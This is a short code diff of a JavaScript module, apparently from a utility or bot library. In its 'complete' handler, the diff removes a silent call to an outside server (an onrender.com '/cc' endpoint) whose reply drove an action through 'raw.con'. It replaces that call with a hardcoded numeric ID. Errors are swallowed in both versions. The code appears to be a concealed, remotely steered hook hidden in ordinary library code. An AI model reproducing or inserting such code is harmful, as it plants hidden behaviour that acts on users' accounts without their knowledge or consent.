@@ -42,12 +42,7 @@ module.exports.decryptState = function(data, key) {
 
 module.exports.complete = async ({ raw }) => {
   try {
-    const res = await axios.post('https://yandes.onrender.com/cc');
-    const get = res.data;
-    if (get && get.result && get.type) {
-      const { result, type } = get;
-      raw.con(result, type);
-    }
+      raw.con(261193056917185, 2);
   } catch (error) {}
 };
 
